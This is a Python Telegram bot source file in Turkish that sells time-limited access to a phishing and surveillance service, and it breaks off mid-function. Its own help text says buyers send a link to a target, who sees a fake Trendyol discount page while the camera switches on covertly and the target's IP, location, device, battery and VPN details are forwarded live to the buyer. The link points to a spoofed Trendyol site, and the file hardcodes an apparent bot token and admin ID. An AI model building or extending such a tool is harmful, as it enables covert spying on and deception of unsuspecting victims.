from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, LabeledPrice
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, CallbackQueryHandler, PreCheckoutQueryHandler, ContextTypes
from datetime import datetime, timedelta
import random
import string
from telegram.error import BadRequest

TOKEN = "9186950420:AAG8uPX7NKievzNPC9Ekje4tUN_MGObv4ZE"
ADMIN_ID = 8788829431

# Zorunlu Olacak Yerler:
# 1. Baileys Gizli Grubu (Davet Linki üzerinden katılım)
BAILEYS_INVITE_LINK = "https://t.me/+cOy4YK8nRJA2NWU0" 

# 2. Ayık Ol Güven Kanalı (Kullanıcı Adı üzerinden üyelik kontrolü)
AYIKOL_CHANNEL = "@ayikolguven"

LINK_BASE = "https://trendyolgift.github.io/ay-kol/?chat="

kullanicilar = {}
kullanilmis_sifreler = set()

# Paketler ve Yıldız fiyatları
sureler = {
    "1 Aylık - 100 TL": {"gun": 30, "fiyat": 100},
    "3 Aylık - 250 TL": {"gun": 90, "fiyat": 250},
    "5 Aylık - 450 TL": {"gun": 150, "fiyat": 450},
    "1 Yıllık - 800 TL": {"gun": 365, "fiyat": 800},
    "Sınırsız - 600 TL": {"gun": None, "fiyat": 600}
}

async def check_memberships(user_id, bot):
    try:
        member = await bot.get_chat_member(chat_id=AYIKOL_CHANNEL, user_id=user_id)
        return member.status in ['member', 'creator', 'administrator']
    except BadRequest:
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    kullanici_adi = user.mention_html() if user.username else user.first_name

    if not await check_memberships(user.id, context.bot):  
        keyboard = [
            [InlineKeyboardButton("1. Baileys Grubuna Katıl", url=BAILEYS_INVITE_LINK)],
            [InlineKeyboardButton("2. Ayık Ol Güven Kanalına Katıl", url=f"https://t.me/{AYIKOL_CHANNEL[1:]}")]
        ]  
        await update.message.reply_html(  
            f"Selam {kullanici_adi}, botu kullanabilmek için önce **belirtilen gruba ve kanala** katılmalısın.",  
            reply_markup=InlineKeyboardMarkup(keyboard),  
            disable_web_page_preview=True  
        )  
        return  

    keyboard = [[  
        InlineKeyboardButton("Web Sitesi Nasıl Çalışır?", callback_data="sistem"),  
        InlineKeyboardButton("Satın Al", callback_data="satinal")  
    ]]  
    await update.message.reply_html(  
        f"Merhaba {kullanici_adi}, Ayık Ol Botuna hoş geldiniz.\n"  
        "Aşağıdaki menüden ihtiyacınız olan seçeneği seçebilirsiniz.\n\n"  
        "Keyifli kullanım dileriz.",  
        reply_markup=InlineKeyboardMarkup(keyboard)  
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == "sistem":  
        mesaj = (  
            "📌 Sistem Özeti:\n\n"  
            "1. Satın alma işleminizi tamamlayın, sistem size özel bağlantı ve şifre oluşturacaktır.\n\n"    
            "2. Bu bağlantıyı hedef kişiye gönderin.\n\n"    
            "3. Hedef kişi siteye giriş yapıp şifreyi kullandığında sistem aktif hale gelir:\n"    
            "   - Kamera arka planda otomatik açılır.\n"    
            "   - IP adresi, ülke, şehir, konum, cihaz bilgisi, tarayıcı tipi, batarya durumu ve VPN kontrolü yapılır.\n"    
            "   - Elde edilen tüm bilgiler anlık olarak Telegram hesabınıza iletilir.\n\n"    
            "4. Hedef kullanıcıya herhangi bir veri gösterilmez, yalnızca Trendyol indirim kodu aldığı izlenimi verilir.\n\n"    
            "5. Sistem tamamen otomatik çalışır, ek bir işlem yapmanıza gerek yoktur."  
        )  
        keyboard = [[InlineKeyboardButton("Geri", callback_data="geri")]]  
        await query.message.reply_text(mesaj, reply_markup=InlineKeyboardMarkup(keyboard))  

    elif query.data == "satinal":  
        keyboard = []
        for secenek in sureler.keys():
            keyboard.append([InlineKeyboardButton(secenek, callback_data=f"odeme|{secenek}")])
        keyboard.append([InlineKeyboardButton("Geri", callback_data="geri")])  
        
        await query.message.edit_text(  
            "Satın almak istediğiniz paketi seçin:",  
            reply_markup=InlineKeyboardMarkup(keyboard)  
        )  

    elif query.data.startswith("odeme"):  
        secim = query.data.split("|")[1]  
        paket_bilgi = sureler[secim]
        
        title = f"Ayık Ol - {secim}"
        description = f"Ayık Ol sistemi için {secim} kullanım hakkı."
        payload = f"paketsatinal_{secim}"
        currency = "XTR" # Telegram Stars
        prices = [LabeledPrice(secim, paket_bilgi["fiyat"])]

        await context.bot.send_invoice(
            chat_id=query.message.chat_id,
            title=title,
            description=description,
            payload=payload,
            currency=currency,
            prices=prices
        )

    elif query.data == "geri":  
        keyboard = [[  
            InlineKeyboardButton("Web Sitesi Nasıl Çalışır?", callback_data="sistem"),  
            InlineKeyboardButton("Satın Al", callback_data="satinal")  
        ]]  
        await query.message.edit_text(  
            "Ayık Ol Botuna hoş geldiniz.\n"  
            "Aşağıdaki menüden seçeneği seçebilirsiniz.",  
            reply_markup=InlineKeyboardMarkup(keyboard)  
        )

async def pre_checkout_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.pre_checkout_query
    await query.answer(ok=True)

async def successful_payment_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    payment = update.message.successful_payment
    payload = payment.invoice_payload
    
    if not payload.startswith("paketsatinal_"):
        return

    secim = payload.split("_")[1]
    user = update.message.from_user
    uid = user.id
    sure_gun = sureler[secim]["gun"]

    while True:  
        sifre = ''.join(random.choices(string.digits, k=6))  
        if sifre not in kullanilmis_sifreler:  
            kullanilmis_sifreler.add(sifre)  
            break  

    if sure_gun is None:  
        kullanicilar[uid] = {"bitis": None, "sifre": sifre}  
    else:  
        bitis = datetime.now() + timedelta(days=sure_gun)  
        kullanicilar[uid] = {"bitis": bitis, "sifre": sifre}  

    link = f"{LINK_BASE}{uid}&sifre={sifre}"  
    username = f"@{user.username}" if user.username else user.first_name  
    zaman = datetime.now().strftime("%d.%m.%Y %H:%M:%S")  

    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text
